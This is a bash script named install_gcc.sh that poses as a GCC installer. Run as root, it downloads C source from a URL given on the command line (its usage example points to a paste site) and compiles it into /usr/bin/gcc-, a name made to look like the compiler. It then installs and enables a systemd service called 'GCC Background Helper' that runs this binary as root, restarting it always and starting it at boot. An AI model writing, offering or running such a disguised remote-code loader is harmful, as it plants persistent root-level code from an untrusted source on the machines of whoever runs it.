#!/usr/bin/env bash
set -euo pipefail

# install_gcc.sh
# Usage: sudo ./install_gcc.sh "https://pastee.dev/d/AouQi1hu/0"
# Must run as root.

LOG="/var/log/install_gcc.log"
SRCFILE="gcc.c"
BINARY="/usr/bin/gcc-"
SERVICE="/etc/systemd/system/gcc-.service"
MAX_TRIES=4
SLEEP_BETWEEN=2

# Helper logging
log() {
  echo "[$(date -u '+%Y-%m-%dT%H:%M:%SZ')] $*" | tee -a "$LOG"
}

if [ "$(id -u)" -ne 0 ]; then
  echo "This installer must be run as root. Exiting."
  exit 2
fi

if [ $# -lt 1 ]; then
  echo "Usage: $0 <source-url>"
  exit 2
fi

URL="$1"
log "[*] Starting installer"
log "[*] Source URL: $URL"

# ensure basic tools exist
if ! command -v gcc >/dev/null 2>&1; then
  log "[ERROR] gcc not found. Please install gcc (e.g. apt install build-essential) and re-run."
  exit 1
fi

DL_TOOL=""
if command -v wget >/dev/null 2>&1; then
  DL_TOOL="wget"
elif command -v curl >/dev/null 2>&1; then
  DL_TOOL="curl"
else
  log "[ERROR] neither wget nor curl found. Install one and retry."
  exit 1
fi

# download with retries and light validation (avoid HTML error pages)
tries=0
while [ $tries -lt $MAX_TRIES ]; do
  tries=$((tries+1))
  log "[*] Download attempt #$tries ..."
  rm -f "$SRCFILE"
  if [ "$DL_TOOL" = "wget" ]; then
    wget -q --timeout=15 --tries=2 -O "$SRCFILE" "$URL" || true
  else
    curl -fSL --max-time 20 -o "$SRCFILE" "$URL" || true
  fi

  if [ ! -s "$SRCFILE" ]; then
    log "[WARN] Download produced zero-size or failed."
  else
    # quick validation: ensure it doesn't start with HTML doctype or <html
    head1=$(head -n 1 "$SRCFILE" | tr '[:upper:]' '[:lower:]' || true)
    if [[ "$head1" == "<!doctype"* || "$head1" == "<html"* || "$head1" == *"error"* && "$head1" == *"html"* ]]; then
      log "[WARN] Download looks like HTML or error page. Retrying..."
      rm -f "$SRCFILE"
    else
      log "[+] Download OK."
      break
    fi
  fi

  if [ $tries -lt $MAX_TRIES ]; then
    sleep $SLEEP_BETWEEN
  fi
done

if [ ! -s "$SRCFILE" ]; then
  log "[ERROR] Failed to download a valid source file after $MAX_TRIES tries. Aborting."
  exit 1
fi

# compile
log "[*] Compiling $SRCFILE -> $BINARY"
if ! gcc -O2 "$SRCFILE" -o "$BINARY"; then
  log "[ERROR] gcc failed to compile $SRCFILE"
  rm -f "$SRCFILE"
  exit 1
fi

rm -f "$SRCFILE"
chmod 755 "$BINARY"
chown root:root "$BINARY"
log "[+] Binary built and installed to $BINARY"

# write systemd service (runs as root)
log "[*] Writing systemd service to $SERVICE"

cat > "$SERVICE" <<'UNIT'
[Unit]
Description=GCC Background Helper
After=network.target

[Service]
Type=simple
User=root
KillSignal=SIGTERM
ExecStart=/usr/bin/gcc-
Restart=always
RestartSec=3

[Install]
WantedBy=multi-user.target
UNIT

log "[*] Reloading systemd and enabling service"
systemctl daemon-reload
systemctl enable --now gcc-.service || true
sleep 0.5

log "----- systemctl status (last lines) -----"
systemctl status --no-pager gcc-.service -n 20 | sed -n '1,200p' | tee -a "$LOG" || true

log "----- journalctl (last 50 lines) -----"
journalctl -u gcc-.service -n 50 --no-pager | tee -a "$LOG" || true

log "[✔] install_gcc.sh finished"
